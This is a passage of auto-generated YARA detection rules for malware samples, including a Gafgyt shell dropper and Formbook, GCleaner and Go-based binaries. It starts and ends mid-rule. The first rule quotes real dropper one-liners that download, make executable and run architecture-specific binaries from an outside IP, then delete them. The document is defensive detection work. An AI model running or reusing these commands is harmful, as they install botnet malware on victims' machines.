      description = "_subset_batch - file Ga-gyt(signature)_f99f9696.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f99f9696f79fb7b703dddbc1f299a6622857a75a2cedfa66c0c2b3635572ab1b"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.ppc; chmod +x 2.ppc; ./2.ppc; rm -rf 2.ppc" fullword ascii /* score: '33.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.i686; chmod +x 2.i686; ./2.i686; rm -rf 2.i6" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.arm6; chmod +x 2.arm6; ./2.arm6; rm -rf 2.ar" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.mpsl; chmod +x 2.mpsl; ./2.mpsl; rm -rf 2.mp" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.i586; chmod +x 2.i586; ./2.i586; rm -rf 2.i5" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.arm6; chmod +x 2.arm6; ./2.arm6; rm -rf 2.ar" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.mips; chmod +x 2.mips; ./2.mips; rm -rf 2.mi" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.arm7; chmod +x 2.arm7; ./2.arm7; rm -rf 2.ar" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.arm4; chmod +x 2.arm4; ./2.arm4; rm -rf 2.ar" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.sparc; chmod +x 2.sparc; ./2.sparc; rm -rf 2" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.m68k; chmod +x 2.m68k; ./2.m68k; rm -rf 2.m6" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.arm5; chmod +x 2.arm5; ./2.arm5; rm -rf 2.ar" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.arm4; chmod +x 2.arm4; ./2.arm4; rm -rf 2.ar" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.m68k; chmod +x 2.m68k; ./2.m68k; rm -rf 2.m6" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.142.148.13/2.arm7; chmod +x 2.arm7; ./2.arm7; rm -rf 2.ar" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 5KB and
      1 of ($x*) and 4 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _ee5432585e746b5f907e5248dfdbf4b9_imphash__acd9bf21_ee5432585e746b5f907e5248dfdbf4b9_imphash__f7486b36_0 {
   meta:
      description = "_subset_batch - from files ee5432585e746b5f907e5248dfdbf4b9(imphash)_acd9bf21.exe, ee5432585e746b5f907e5248dfdbf4b9(imphash)_f7486b36.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "acd9bf21407e50a3804f543d4b8d90a10fe0729d769b0fb331d9745a990b2229"
      hash2 = "f7486b366f14ff01c29b7b5f2232c15cb13511c7a646239d9556e04d9db9b30a"
   strings:
      $x1 = "shellexperiencehost.exe" fullword wide /* score: '32.00'*/
      $s2 = "        <assemblyIdentity type=\"Win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"" ascii /* score: '27.00'*/
      $s3 = "        <assemblyIdentity type=\"Win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"" ascii /* score: '21.00'*/
      $s4 = "Windows Shell Experience Component" fullword wide /* score: '17.00'*/
      $s5 = "UXglSnVKG" fullword ascii /* base64 encoded string 'Qx%JuJ' */ /* score: '14.00'*/
      $s6 = "uKGZ9OW13" fullword ascii /* base64 encoded string '(f}9mw' */ /* score: '14.00'*/
      $s7 = "gdSRROGZV" fullword ascii /* base64 encoded string 'u$Q8fU' */ /* score: '14.00'*/
      $s8 = "dnowK2Zu9" fullword ascii /* base64 encoded string 'vz0+fn' */ /* score: '14.00'*/
      $s9 = "NFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKe" ascii /* score: '11.00'*/
      $s10 = "bPrmTxgeSORKGZY92RGb4qZMp3NDoEJwyvMuF9kkcbPrmUxgdSoRKGZY92RGb4qZMp3NDoEJwyvMuF9kkcbPrmUxgdSoRKGZY92RGb4qZMp3NDoEJwyvMuF9kkcbPrmU" ascii /* score: '11.00'*/
      $s11 = "UyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR87tNKm2YdYVmsJiMNFuCvLbUKeGHWTfcyfpFxyPglWJIeunIXZUyNvFILtR8" ascii /* score: '11.00'*/
      $s12 = "3NDoEJwyvMuF9kkcbPrmUxgdSoRKGZY92RGb4qZMp3NDoEJwyvMuF9kkcbPrmUxgdSoRKGZY92RGb4qZMp3NDoEJwyvMuF9kkcbPrmUxgdSoRKGZY92RGb4qZMp3NDoE" ascii /* score: '11.00'*/
      $s13 = "MuF9kjcbPrmUxgdSoRKGZX92RGb4qZMp3NDoEJwyvMuF9kkcbPrmUygdSoRKGZY92RGb4qZMp3NDoEJwyvMuF8kkcbPrmUxgdSoRKFZY92RGb4qZMp3NDnEJwyvMuF9k" ascii /* score: '11.00'*/
      $s14 = "MuF9kkcbPrmUxgdSoRKGZY92RGb4qZMp3NDoEJwyvMuF9kkcbPrmUxgdSoRKGZY92RGb4qZMp3NDoEJwyvMuF9kkcbPrmUxgdSoRKGZY92RGb4qZMp3NDoEJwyvMuF9k" ascii /* score: '11.00'*/
      $s15 = "gdSoRKGZY92RGb4qZMp3NDoEJwyvMuF9kkcbPrmUxgdSoRKGZY92RGb4qZMp3NDoEJwyvMuF9kkcbPrmUxgdSoRKGZY92RGb4qZMp3NDoEJwyvMuF9kkcbPrmUxgdSoR" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and pe.imphash() == "ee5432585e746b5f907e5248dfdbf4b9" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _e8b33af5f925a9f81785c84066212ab0a0b6c3c8894e669f988a8bd6dea9d4e5_e8b33af5_f31094aace3622e2a193f007c7cdf6eb9ad1199b5784096a0_1 {
   meta:
      description = "_subset_batch - from files e8b33af5f925a9f81785c84066212ab0a0b6c3c8894e669f988a8bd6dea9d4e5_e8b33af5.elf, f31094aace3622e2a193f007c7cdf6eb9ad1199b5784096a06cfbac4c96ce3a5_f31094aa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e8b33af5f925a9f81785c84066212ab0a0b6c3c8894e669f988a8bd6dea9d4e5"
      hash2 = "f31094aace3622e2a193f007c7cdf6eb9ad1199b5784096a06cfbac4c96ce3a5"
   strings:
      $x1 = " is not allowed in FIPS 140-only modex509: a root or intermediate certificate is not authorized to sign for this name: refusing " ascii /* score: '62.50'*/
      $x2 = "x509: cannot verify signature: algorithm unimplementedx509: invalid RDNSequence: invalid attribute value: %sURI with IP (%q) can" ascii /* score: '59.50'*/
      $x3 = "tried to trace goroutine with invalid or unsupported statussync: WaitGroup is reused before previous Wait has returnedsync/atomi" ascii /* score: '56.00'*/
      $x4 = "accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-encoded table f=timer moved between " ascii /* score: '50.00'*/
      $x5 = "abbradiogrouparamainavalueaccept-charsetbodyaccesskeygenobrbasefontimeupdateviacacheightmlabelooptgroupatternoembedetailsampictu" ascii /* score: '48.00'*/
      $x6 = "github.com/EDDYCJY/fake-useragent/downloader.(*Download).Get" fullword ascii /* score: '45.00'*/
      $x7 = "x509: failed to parse URI constraint %q: cannot be IP addressexpected attribute selector ([attribute]), found '%c' insteadtls: s" ascii /* score: '39.50'*/
      $x8 = "socks bindProcessingNo Content%s|%s%s|%s/dev/stdinreaddirent (deleted)pidfd_openpidfd_waitexecerrdotnotifyListprofInsertstackLar" ascii /* score: '37.00'*/
      $x9 = "github.com/valyala/fasthttp.getCookieKey" fullword ascii /* score: '31.00'*/
      $x10 = "crypto/elliptic: ScalarMult was called on an invalid pointx509: authority key identifier incorrectly marked criticalx509: certif" ascii /* score: '31.00'*/
      $s11 = "github.com/EDDYCJY/fake-useragent.(*browser).Random" fullword ascii /* score: '30.00'*/
      $s12 = "github.com/valyala/fasthttp.(*RequestHeader).SetNoDefaultContentType" fullword ascii /* score: '30.00'*/
      $s13 = "github.com/valyala/fasthttp.(*RequestHeader).SetContentLength" fullword ascii /* score: '30.00'*/
      $s14 = "github.com/valyala/fasthttp.(*ResponseHeader).SetContentLength" fullword ascii /* score: '30.00'*/
      $s15 = "github.com/EDDYCJY/fake-useragent/spiders.(*Spider).StartBrowser.deferwrap1" fullword ascii /* score: '30.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _e8b33af5f925a9f81785c84066212ab0a0b6c3c8894e669f988a8bd6dea9d4e5_e8b33af5_f09e1577f6af02a154d8bb1ad4e946fbb8155f0cf75e3fb74_2 {
   meta:
      description = "_subset_batch - from files e8b33af5f925a9f81785c84066212ab0a0b6c3c8894e669f988a8bd6dea9d4e5_e8b33af5.elf, f09e1577f6af02a154d8bb1ad4e946fbb8155f0cf75e3fb749eb446bb232e3b4_f09e1577.elf, f31094aace3622e2a193f007c7cdf6eb9ad1199b5784096a06cfbac4c96ce3a5_f31094aa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e8b33af5f925a9f81785c84066212ab0a0b6c3c8894e669f988a8bd6dea9d4e5"
      hash2 = "f09e1577f6af02a154d8bb1ad4e946fbb8155f0cf75e3fb749eb446bb232e3b4"
      hash3 = "f31094aace3622e2a193f007c7cdf6eb9ad1199b5784096a06cfbac4c96ce3a5"
   strings:
      $s1 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s2 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s3 = "os/exec.Command.func1" fullword ascii /* score: '24.00'*/
      $s4 = "os/exec.Command" fullword ascii /* score: '24.00'*/
      $s5 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s6 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s7 = "on a locked thread with no template threadunexpected signal during runtime execution received but handler not on signal stack" fullword ascii /* score: '21.00'*/
      $s8 = "type:.eq.log.Logger" fullword ascii /* score: '21.00'*/
      $s9 = "syscall.forkExecPipe" fullword ascii /* score: '21.00'*/
      $s10 = "sync.runtime_SemacquireRWMutex" fullword ascii /* score: '21.00'*/
      $s11 = "sync.runtime_SemacquireRWMutexR" fullword ascii /* score: '21.00'*/
      $s12 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s13 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s14 = "os/exec.(*Cmd).Run" fullword ascii /* score: '20.00'*/
      $s15 = "*exec.Cmd" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__8f7b48c9_Formbook_signature__924b0dce_3 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_8f7b48c9.js, Formbook(signature)_924b0dce.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8f7b48c9b0cb0702de08f98e8e4fb2cd47103b219beff7815dc8e742039c12cb"
      hash2 = "924b0dceaff615222d342df227e1ae71358c5105c71f95af59f546e33b98d70c"
   strings:
      $s1 = "//Dilettantisk; coauthered, underwritten verdensprocessens dyrekredsene!" fullword ascii /* score: '18.00'*/
      $s2 = "var Handloader = -59497;" fullword ascii /* score: '17.00'*/
      $s3 = "//Spj uncoded chondriosomes," fullword ascii /* score: '16.00'*/
      $s4 = "//Hyoides circumzenithal smokables charcoalist; cotemporaneously" fullword ascii /* score: '16.00'*/
      $s5 = "//Lgs unjewish processorfamilie212:" fullword ascii /* score: '15.00'*/
      $s6 = "var Noncontemptibly = -2198;" fullword ascii /* score: '15.00'*/
      $s7 = "//Coprocessoren hnekyllings; mastodon," fullword ascii /* score: '15.00'*/
      $s8 = "//Macroprocessors, cistercienserklostre," fullword ascii /* score: '15.00'*/
      $s9 = "//Marionetteater enfatico: certifikatpligternes. postscript denationalised" fullword ascii /* score: '15.00'*/
      $s10 = "//Meristele spaltningsprocesserne. ellington; eksamensresultater gyms" fullword ascii /* score: '15.00'*/
      $s11 = "var Tamanoas = \"Fremdateringerne allergolog:\";" fullword ascii /* score: '15.00'*/
      $s12 = "var Sekundrprocesserne225 = \"beefin stjforholds\";" fullword ascii /* score: '15.00'*/
      $s13 = "//Bdeudmaalingers aldringsprocessernes hanoverian" fullword ascii /* score: '15.00'*/
      $s14 = "//Machiavellism. processionen! alkoverne," fullword ascii /* score: '15.00'*/
      $s15 = "//Datalogger199; blgeskret; belligerences; grindernes229" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _fab63ff0733b37be61bf41db0c75fd00_imphash__Formbook_signature__b5d219cadf364ee08ec41750ee8b7919_imphash__4 {
   meta:
      description = "_subset_batch - from files fab63ff0733b37be61bf41db0c75fd00(imphash).exe, Formbook(signature)_b5d219cadf364ee08ec41750ee8b7919(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2a89254a62a2e00d05c0f7d3b69f7cc8ef8890548ba59c49a37b2ea4cd4a28ad"
      hash2 = "6225c55f07372506a0fd8ab964b9326646fd11e12bf3c88c812cf8fbb67f85d9"
   strings:
      $x1 = "System.ComponentModel.Design.IDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" fullword wide /* score: '34.00'*/
      $x2 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $x3 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $x4 = "System.Diagnostics.Design.ProcessDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '32.00'*/
      $x5 = "<System.Diagnostics.Process.dll" fullword ascii /* score: '31.00'*/
      $x6 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $x7 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $x8 = "System.Linq.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '31.00'*/
      $s9 = "LSystem.Diagnostics.FileVersionInfo.dll4System.Diagnostics.Process" fullword ascii /* score: '30.00'*/
      $s10 = "4System.Private.CoreLib.dll" fullword ascii /* score: '29.00'*/
      $s11 = ":System.Private.TypeLoader.dll8System.Security.Cryptography" fullword ascii /* score: '28.00'*/
      $s12 = "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s13 = "TargetvM:System.Security.Cryptography.CryptoConfigForwarder.#cctor" fullword ascii /* score: '25.00'*/
      $s14 = "BSystem.Collections.NonGeneric.dll@System.ComponentModel.Primitives" fullword ascii /* score: '25.00'*/
      $s15 = "DeleteTimerXSystem.Threading.IThreadPoolWorkItem.Execute" fullword ascii /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _e8ac1646024d52d1534a88da2e8037cd_imphash__e8ac1646024d52d1534a88da2e8037cd_imphash__c2fd8933_5 {
   meta:
      description = "_subset_batch - from files e8ac1646024d52d1534a88da2e8037cd(imphash).exe, e8ac1646024d52d1534a88da2e8037cd(imphash)_c2fd8933.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cc2ac44600c54a6852ff94ad74641188a1750f78002182541df34db394c123b9"
      hash2 = "c2fd8933cc7a587bb6dc4e85b709c36d611e2f8ddb9ef5b586ba72fc0e194beb"
   strings:
      $x1 = "<file name=\"comctl32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x2 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $s4 = "<file name=\"netutils.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s5 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s6 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s7 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s8 = "Please specify the password using the /PASSWORD= command line parameter." fullword wide /* score: '24.00'*/
      $s9 = "GetTempDir: GetTempPath failed (%u, %u)" fullword wide /* score: '21.50'*/
      $s10 = "FHeaderProcessed" fullword ascii /* score: '20.00'*/
      $s11 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s12 = "For more detailed information, please visit https://jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide /* score: '18.00'*/
      $s13 = "Shared.CommonFunc" fullword ascii /* score: '17.00'*/
      $s14 = "D:\\Coding\\Is\\issrc-build\\Components\\ChaCha20.pas" fullword wide /* score: '16.00'*/
      $s15 = "GNo single cast observer with ID %d was added to the observer collectionFNo multi cast observer with ID %d was added to the obse" wide /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "e8ac1646024d52d1534a88da2e8037cd" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Formbook_signature__1895460fffad9475fda0c84755ecfee1_imphash__Formbook_signature__1895460fffad9475fda0c84755ecfee1_imphash__6 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_03e775b1.exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_11281b9f.exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_2595281b.exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_5401b817.exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_611800d2.exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_907d8edd.exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_98ec928b.exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_9b03c249.exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_b486ec03.exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_b51ddf96.exe, Formbook(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_c8eb8682.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "47f572b79047a00288b5160b8c466127c1fb187f4d7ab99a1865b2f41468d547"
      hash2 = "03e775b1f1434bf32d54001148665d9efadaf1462c4c302982c136fa496081ae"
      hash3 = "11281b9f1d4f0e9042a00ec35f919bca3e86ad1954ee7f5ea29eb218d02f022b"
      hash4 = "2595281b5b566d89b9084d6ef9231138fa54ce76a019c9257801ba2fd3958047"
      hash5 = "5401b817a34423ed0c9352b9096b597c13b8a15b918b5b891487170b490fbd04"
      hash6 = "611800d260a261ca41759e9c79312cdabe2529bc8fe362f296b348c5fa1a5c09"
      hash7 = "907d8eddf8dab1801a43b76b0ff755ca1a251d815b07d657bcb48924acb545bf"
      hash8 = "98ec928bfe73892d32fe2bda268c9d5214fdc29c04a0c94e761511569a9484ac"
      hash9 = "9b03c2490861e7acb0399ba7f83c0624d9601ebeeba650a602a17d58c3a1234f"
      hash10 = "b486ec0314eabf1bd79a42201829893561d949978e264bcaec545ba7f1b25f10"
      hash11 = "b51ddf9600f7c0fc2a33a333fd7aac65eb2b3cd066a8153fd61a3b212c068ca7"
      hash12 = "c8eb86820e2bb79b01f13912d9dc05afe153c0eb4465aa6ccdcb4bff68b2c343"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s2 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s4 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s5 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s6 = "SCRIPTNAME" fullword wide /* base64 encoded string 'H$H=3@0' */ /* score: '22.50'*/
      $s7 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s9 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s10 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s11 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "0b768923437678ce375719e30b21693e" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__585b5e40_Formbook_signature__742b4a93_Formbook_signature__ad48a932_Formbook_signature__d04d3a4b_Formboo_7 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_585b5e40.js, Formbook(signature)_742b4a93.js, Formbook(signature)_ad48a932.js, Formbook(signature)_d04d3a4b.js, Formbook(signature)_d15f181f.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "585b5e40d5bca4c94fa470880b4a5d9e485322859e5500b6879ad2a5d5971c84"
      hash2 = "742b4a9321fdf11679df04ed3ffbdc068467c5698e2f26766d64712ab3e3dd61"
      hash3 = "ad48a932a36fdc1aa91c7de67f275c7cfbaaf19cb78537488b57d2d1db17c677"
      hash4 = "d04d3a4bb56441a2fe3e1ad488c42c227ea125a6875434cb15d1f1a894b246fd"
      hash5 = "d15f181f7ec7fd24e51fa9ae9f76aaa888762bccddab332d0892e80171789e10"
   strings:
      $s1 = "//Koggerne spildevandstilladelsens moebler dumpekaraktererne: phytosociologist." fullword ascii /* score: '19.00'*/
      $s2 = "//Surveyed? ssterselskabs; extempory" fullword ascii /* score: '16.00'*/
      $s3 = "//Brunelles hypsometer! reube183; fluorinated commandrie:" fullword ascii /* score: '15.00'*/
      $s4 = "//Filmforestillingerne. circumscriptly; kapur luminophor:" fullword ascii /* score: '15.00'*/
      $s5 = "//Accounted finansselskab? tilvirkedes tempters hderligheders" fullword ascii /* score: '14.00'*/
      $s6 = "//Indfjnings119 krediteringens valget: katalogisvbr" fullword ascii /* score: '14.00'*/
      $s7 = "//Saanings moveably! logget tontinernes:" fullword ascii /* score: '14.00'*/
      $s8 = "//Elevatorskakts antineutral: theologizer scension! ungorge" fullword ascii /* score: '14.00'*/
      $s9 = "//Integrating abnormalizes240; diamantoid wickiups192? shellycoat" fullword ascii /* score: '12.00'*/
      $s10 = "//Hypostatises: translatr. yomas114 bismervgtene keyserlick" fullword ascii /* score: '12.00'*/
      $s11 = "//Hawkeye! romancelet," fullword ascii /* score: '12.00'*/
      $s12 = "//Pudderne tenorfljters? computerteknologien?" fullword ascii /* score: '12.00'*/
      $s13 = "Aspirationskeurb = Aspirationskeurb - 5464054;" fullword ascii /* score: '12.00'*/
      $s14 = "//Trilogic? outbanning becomes badenes urethralgia:" fullword ascii /* score: '12.00'*/
      $s15 = "//Affilieret aktanter! nontemporarily! aabenbarede" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _GCleaner_signature__2cee91607b91395fbe3809ac0a436cd3_imphash__GCleaner_signature__2cee91607b91395fbe3809ac0a436cd3_imphash__8 {
   meta:
      description = "_subset_batch - from files GCleaner(signature)_2cee91607b91395fbe3809ac0a436cd3(imphash).exe, GCleaner(signature)_2cee91607b91395fbe3809ac0a436cd3(imphash)_0829c26f.exe, GCleaner(signature)_2cee91607b91395fbe3809ac0a436cd3(imphash)_5807f7e7.exe, GCleaner(signature)_2cee91607b91395fbe3809ac0a436cd3(imphash)_5dfcdc1c.exe, GCleaner(signature)_4fdf814116f25d72ed5b4fb0454f8a2e(imphash).exe, GCleaner(signature)_4fdf814116f25d72ed5b4fb0454f8a2e(imphash)_110fd095.exe, GCleaner(signature)_4fdf814116f25d72ed5b4fb0454f8a2e(imphash)_a53952ad.exe, GCleaner(signature)_4fdf814116f25d72ed5b4fb0454f8a2e(imphash)_b43fe581.exe, GCleaner(signature)_4fdf814116f25d72ed5b4fb0454f8a2e(imphash)_e6ce0c13.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3af9889ab592d0460705a4472a6372f5e79e26d4f8aca0966a4653ac74e8084a"
      hash2 = "0829c26f3453be9269c2e48dd3393d7f5e1dc843e4ce309da7704b5e6ac3aa21"
      hash3 = "5807f7e7d5b0240ae218cb9e7c50fbdbbe2ea66007c4276b5ad4e7ae4c4b94fd"
      hash4 = "5dfcdc1c491fbf2f7f2fbac6bbf27b84be652583b66b252c46e8ed86577c3c60"
      hash5 = "477df2a52197bd71524c4ccf192ce2d2afb8b4b3d8e33f8efa418910342f30e7"
      hash6 = "110fd095374fef103943ce10fcf71d8619dbe65011ad9893bc0fe3b8a24d20c8"
      hash7 = "a53952ad1b88e5d6b4fc14f09e4ccd0f2ce4be72df7c5693abd8cdad953a4871"
      hash8 = "b43fe5810af7c86f8b5165f90c607e1d99fc97b2b69e3ff72e14b09a00620fb3"
      hash9 = "e6ce0c13aaf5187d4ef76420af9ccd486262292f0c1e68a2f0c25b7c8be4cd09"
   strings:
      $s1 = "%Axis Minimum Value must be <= Maximum%Axis Maximum Value must be >= Minimum$Axis Logarithmic Base should be >= 2+3D effect perc" wide /* score: '21.00'*/
      $s2 = "ElevationT" fullword ascii /* score: '16.00'*/
      $s3 = "TCommonDialogT" fullword ascii /* score: '12.00'*/
      $s4 = "PasswordChar\\" fullword ascii /* score: '12.00'*/
      $s5 = "TBRUSHDIALOG" fullword wide /* score: '11.50'*/
      $s6 = "TPENDIALOG" fullword wide /* score: '11.50'*/
      $s7 = "EComponentError OA" fullword ascii /* score: '10.00'*/
      $s8 = "Window Text %s is already associated with %s" fullword wide /* score: '10.00'*/
      $s9 = "ltsLeftPercent" fullword ascii /* score: '9.00'*/
      $s10 = "OnGetPointerStyle" fullword ascii /* score: '9.00'*/
      $s11 = "bsPyramid" fullword ascii /* score: '9.00'*/
      $s12 = "OnGetMarkTextSVW" fullword ascii /* score: '9.00'*/
      $s13 = "CircledT" fullword ascii /* score: '9.00'*/
      $s14 = "6 6$6(6@6[6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'fff' */
      $s15 = "TCircledSeriesX" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__7343fde1_Formbook_signature__d54eb102_9 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_7343fde1.js, Formbook(signature)_d54eb102.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7343fde1eb7ed90af6b923297177ae109f2ff9b8e86cee4f5961cf619fad81f4"
      hash2 = "d54eb1027281e9a83ca07c521d6db3090320cccf8a5424a2d191cbdc1b54b743"
   strings:
      $x1 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null, 48));" fullword ascii /* score: '34.00'*/
